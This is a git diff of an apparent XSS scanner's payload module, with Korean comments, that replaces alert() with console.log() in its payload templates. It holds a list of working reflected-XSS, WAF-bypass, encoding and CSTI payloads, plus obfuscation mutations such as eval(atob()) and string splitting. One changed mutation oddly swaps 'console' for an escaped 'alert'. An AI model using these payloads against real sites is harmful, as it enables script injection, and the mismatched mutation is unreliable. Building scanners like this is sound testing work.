@@ -43,7 +43,7 @@ def _replace_markers(value: str) -> str:
 
     # B64_MARKER가 있다면, 방금 만든 'marker'를 인코딩해서 넣음
     if "{{B64_MARKER}}" in value:
-        payload = f"alert(`{marker}`)"  # 백틱 유지
+        payload = f"console.log(`{marker}`)"  # 백틱 유지
         b64_payload = base64.b64encode(payload.encode()).decode()
         value = value.replace("{{B64_MARKER}}", b64_payload)
 
@@ -51,7 +51,7 @@ def _replace_markers(value: str) -> str:
 
 
 # ============================================================
-# ⚠️  JS 위험 함수(alert, console.log 등) 추가/변경 시 
+# ⚠️  JS 위험 함수 추가/변경 시 
 # 반드시 아래 3곳을 동시에 수정
 # 1. analyzer_1.py: _RE_DANGEROUS_JS
 # 2. payloads_1.py: _mutate_cached (Level 2 백틱, Level 3 우회 로직)
@@ -93,19 +93,19 @@ def _mutate_cached(base_value: str, level: int) -> frozenset[str]:
     if level >= 2:
         lvl2: Set[str] = set()
         for val in list(mutations):
-            # 괄호 대신 백틱 (alert와 console.log 모두 지원)
-            if re.search(r'(alert|console\.log)\s*[\(`]', val, re.I):
+            # 괄호 대신 백틱 
+            if re.search(r'(console\.log)\s*[\(`]', val, re.I):
                 modified = re.sub(
-                    r'(alert|console\.log)\s*\([\'"]([^\'"]*)[\'\"]\)',
+                    r'(console\.log)\s*\([\'"]([^\'"]*)[\'\"]\)',
                     lambda m: f"{m.group(1)}`{m.group(2)}`",
                     val
                 )
                 lvl2.add(modified)
 
             # JS 유니코드 이스케이프 
-            if "alert" in val.lower():
-                lvl2.add(val.replace("alert", "\\u0061lert"))
-                lvl2.add(val.replace("alert", "\\u0061\\u006cert"))
+            if "console" in val.lower():
+                lvl2.add(val.replace("console", "\\u0061lert"))
+                lvl2.add(val.replace("console", "\\u0061\\u006cert"))
 
         mutations.update(lvl2)
 
@@ -114,31 +114,31 @@ def _mutate_cached(base_value: str, level: int) -> frozenset[str]:
         lvl3: Set[str] = set()
         for val in list(mutations):
             # 1. Base64 eval 난독화 
-            if re.search(r'(alert|console\.log)\s*\([\'"`]\{\{MARKER\}\}[\'"`]\)', val, re.IGNORECASE):
+            if re.search(r'console\.log\s*\([\'"`]\{\{MARKER\}\}[\'"`]\)', val, re.IGNORECASE):
                 lvl3.add(re.sub(
-                    r'(alert|console\.log)\s*\([\'"`]\{\{MARKER\}\}[\'"`]\)',
+                    r'console\.log\s*\([\'"`]\{\{MARKER\}\}[\'"`]\)',
                     "eval(atob(`{{B64_MARKER}}`))",
                     val,
                     flags=re.IGNORECASE
                 ))
 
-            # 2. top['al'+'ert'] 문자열 분리 
-            if re.search(r"alert[(`]", val, re.IGNORECASE):
+            # 2. top['con'+'sole']['lo'+'g'] 문자열 분리 
+            if re.search(r"console\.log[(`]", val, re.IGNORECASE):
                 lvl3.add(re.sub(
-                    r"(?i)alert",
-                    r"top['al'+'ert']",
+                    r"(?i)console\.log",
+                    r"top['con'+'sole']['lo'+'g']",
                     val
                 ))
 
-            # 3. setTimeout 우회 (alert, console.log 지원)
-            if re.search(r'(alert|console\.log)\s*[(`]', val, re.IGNORECASE):
+            # 3. setTimeout 우회 
+            if re.search(r'(console\.log)\s*[(`]', val, re.IGNORECASE):
                 lvl3.add(re.sub(
-                    r'(?i)((alert|console\.log)\s*[(`].*?[)`])',
+                    r'(?i)((console\.log)\s*[(`].*?[)`])',
                     r"setTimeout(()=>\1)",
                     val
                 ))
                 lvl3.add(re.sub(
-                    r'(?i)((alert|console\.log)\s*[(`].*?[)`])',
+                    r'(?i)((console\.log)\s*[(`].*?[)`])',
                     r"setTimeout(function(){\1})",
                     val
                 ))
@@ -255,39 +255,39 @@ def _get_builtin_payloads() -> List[Payload]:
     """내장 페이로드 ({{MARKER}} 플레이스홀더 상태 유지)"""
     templates = [
         # 기본
-        ("<script>alert('{{MARKER}}')</script>", "reflected_xss:basic", "HIGH"),
-        ("<script>alert(document.domain)</script>", "reflected_xss:basic", "HIGH"),
+        ("<script>console.log('{{MARKER}}')</script>", "reflected_xss:basic", "HIGH"),
+        ("<script>console.log(document.domain)</script>", "reflected_xss:basic", "HIGH"),
         # 이벤트 핸들러
-        ("<img src=x onerror=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
-        ("<svg onload=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
-        ("<svg/onload=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
-        ("<body onload=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
-        ("<input onfocus=alert('{{MARKER}}') autofocus>", "reflected_xss:event_handler", "HIGH"),
-        ("<details open ontoggle=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
-        ("<video><source onerror=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
-        ("<marquee onstart=alert('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<img src=x onerror=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<svg onload=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<svg/onload=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<body onload=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<input onfocus=console.log('{{MARKER}}') autofocus>", "reflected_xss:event_handler", "HIGH"),
+        ("<details open ontoggle=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<video><source onerror=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
+        ("<marquee onstart=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
         # 속성 탈출
-        ("'\"><script>alert('{{MARKER}}')</script>", "reflected_xss:attribute_breakout", "HIGH"),
-        ("'><img src=x onerror=alert('{{MARKER}}')>", "reflected_xss:attribute_breakout", "HIGH"),
-        ("\" onmouseover=\"alert('{{MARKER}}')\"", "reflected_xss:attribute_injection", "MEDIUM"),
+        ("'\"><script>console.log('{{MARKER}}')</script>", "reflected_xss:attribute_breakout", "HIGH"),
+        ("'><img src=x onerror=console.log('{{MARKER}}')>", "reflected_xss:attribute_breakout", "HIGH"),
+        ("\" onmouseover=\"console.log('{{MARKER}}')\"", "reflected_xss:attribute_injection", "MEDIUM"),
         # JavaScript 컨텍스트
-        ("</script><script>alert('{{MARKER}}')</script>", "reflected_xss:tag_breakout", "HIGH"),
-        ("';alert('{{MARKER}}');//", "reflected_xss:js_breakout", "HIGH"),
-        ("\";alert('{{MARKER}}');//", "reflected_xss:js_breakout", "HIGH"),
+        ("</script><script>console.log('{{MARKER}}')</script>", "reflected_xss:tag_breakout", "HIGH"),
+        ("';console.log('{{MARKER}}');//", "reflected_xss:js_breakout", "HIGH"),
+        ("\";console.log('{{MARKER}}');//", "reflected_xss:js_breakout", "HIGH"),
         # URI
-        ("<a href=\"javascript:alert('{{MARKER}}')\">click</a>", "reflected_xss:protocol", "MEDIUM"),
-        ("<iframe src=\"javascript:alert('{{MARKER}}')\">", "reflected_xss:protocol", "HIGH"),
+        ("<a href=\"javascript:console.log('{{MARKER}}')\">click</a>", "reflected_xss:protocol", "MEDIUM"),
+        ("<iframe src=\"javascript:console.log('{{MARKER}}')\">", "reflected_xss:protocol", "HIGH"),
         # WAF 우회 (내장)
-        ("<ScRiPt>alert('{{MARKER}}')</sCrIpT>", "reflected_xss:waf_bypass", "MEDIUM"),
-        ("<svg\tonload=alert('{{MARKER}}')>", "reflected_xss:waf_bypass", "HIGH"),
-        ("<svg\nonload=alert('{{MARKER}}')>", "reflected_xss:waf_bypass", "HIGH"),
-        ("<img src=x onerror=alert`'{{MARKER}}'`>", "reflected_xss:waf_bypass", "HIGH"),
+        ("<ScRiPt>console.log('{{MARKER}}')</sCrIpT>", "reflected_xss:waf_bypass", "MEDIUM"),
+        ("<svg\tonload=console.log('{{MARKER}}')>", "reflected_xss:waf_bypass", "HIGH"),
+        ("<svg\nonload=console.log('{{MARKER}}')>", "reflected_xss:waf_bypass", "HIGH"),
+        ("<img src=x onerror=console.log`'{{MARKER}}'`>", "reflected_xss:waf_bypass", "HIGH"),
         # 인코딩
-        ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('{{MARKER}}')>", "reflected_xss:encoding", "HIGH"),
+        ("<img src=x onerror=&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;('{{MARKER}}')>", "reflected_xss:encoding", "HIGH"),
         # CSTI
-        ("{{constructor.constructor('alert(\"{{MARKER}}\")')()}}", "reflected_xss:csti", "HIGH"),
+        ("{{constructor.constructor('console.log(\"{{MARKER}}\")')()}}", "reflected_xss:csti", "HIGH"),
         # Polyglot
-        ("'><img src=x onerror=alert('{{MARKER}}')><\"", "reflected_xss:polyglot", "HIGH"),
+        ("'><img src=x onerror=console.log('{{MARKER}}')><\"", "reflected_xss:polyglot", "HIGH"),
     ]
 
     return [
